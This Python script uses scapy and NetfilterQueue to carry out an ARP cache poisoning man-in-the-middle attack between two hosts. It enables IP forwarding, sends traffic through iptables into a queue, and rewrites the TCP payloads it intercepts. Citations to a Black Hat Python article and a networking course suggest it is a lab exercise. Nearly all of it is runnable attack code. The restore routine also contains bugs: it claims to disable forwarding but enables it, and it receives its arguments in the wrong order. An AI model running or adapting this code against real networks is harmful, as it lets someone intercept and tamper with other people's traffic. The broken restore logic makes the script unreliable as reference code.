# Sources: https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
# https://networks.hypha.ro/capitolul6/#scapy_dns_spoofing
# https://networks.hypha.ro/
from scapy.all import *
import os
import signal
import sys
import threading
import time
import struct
from netfilterqueue import NetfilterQueue as NFQ

# ARP Poison parameters
gateway_ip = "198.7.0.1"
packet_count = 1000
# network interface (for linux)
# conf.iface = "eth0"
conf.verb = 0

def get_mac_address(ip_address):
    # Send ARP request and return the MAC address
    # Source: https://www.thepythoncode.com/article/building-network-scanner-using-scapy
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc

def restore_network(gateway_ip, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding 
    os.system("sysctl -w net.ipv4.ip_forward=1")


# Function for sending ARP packets
def arp_spoof(target_ip, target_mac, gateway_ip=gateway_ip):
    try:
        # Send ARP packets while the program is running
        if target_mac == "":
            print("TARGET MAC FINDING: ")
            target_mac = get_mac_address(target_ip)
        while True:
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(1)
    except KeyboardInterrupt:
        restore_network(target_ip, target_mac, gateway_ip)
        print("ARP spoofing attack ended.")


def modify_packet(packet):
    scapy_packet = IP(packet.get_payload())  # Convert string of packet to scapy packet
    
    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw):  # payload
        load = scapy_packet[Raw].load.decode(errors="ignore")
        if(load == ""):
            return packet
        print("LOAD BEFORE: ", load)
        modified_load = load[:len(load)-5] + "SALUT"
        scapy_packet[Raw].load = modified_load.encode()
        print("LOAD AFTER: ", modified_load)
        del scapy_packet[IP].len
        del scapy_packet[IP].chksum
        del scapy_packet[TCP].chksum

        packet.set_payload(bytes(scapy_packet))
        print("AFTER INSIDE MODIFY:", packet.get_payload())

    return packet



def process_packet(packet):
    payload = packet.get_payload()
    
    scapy_packet_for_output = IP(payload)
    dest_ip = scapy_packet_for_output[IP].dst
    source_ip = scapy_packet_for_output[IP].src
    dest_port = scapy_packet_for_output[TCP].dport

    print("Received packet payload BEFORE:", payload)
    print("\n\n\n")
    print("Original destination IP:", dest_ip)
    print("Source IP:", source_ip)
    print("Original destination port:", dest_port)

    time.sleep(0.2)

    scapy_packet = modify_packet(packet)

    print("\n\n\n")
    print("Scapy packet payload AFTER:", scapy_packet)
    print("Received packet payload AFTER:", scapy_packet.get_payload())
    print("\n\n\n")
    # time.sleep(2)
    scapy_packet.accept()
    print("Packet accepted")


def packet_sniff():
    queue = NFQ()
    try:
        print("Packet sniffing started.")
        queue.bind(5, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("Packet sniffing ended.")
        queue.unbind()

# Start the script
print("Started script")
print("Enabling IP forwarding")

# Enable IP Forwarding on
os.system("sysctl -w net.ipv4.ip_forward=1")
print("Successfully enabled IP forwarding")
os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")
os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
print("IP forwarding enabled in queue 5")

# ARP poison threads
poison_thread_router = threading.Thread(target=arp_spoof, args=("198.7.0.1", "", "198.7.0.2"))
poison_thread_server = threading.Thread(target=arp_spoof, args=("198.7.0.2", "", "198.7.0.1"))

try:
    poison_thread_router.start()
    time.sleep(1)
    print("router ARP spoofing started")
except:
    print("router ARP spoofing failed")

try:
    poison_thread_server.start()
    time.sleep(1)
    print("server ARP spoofing started")
except:
    print("server ARP spoofing failed")


# Start packet sniffing in a separate thread
sniff_thread = threading.Thread(target=packet_sniff)
try:
    sniff_thread.start()
    print("Packet sniffing started")
except:
    print("Packet sniffing failed")
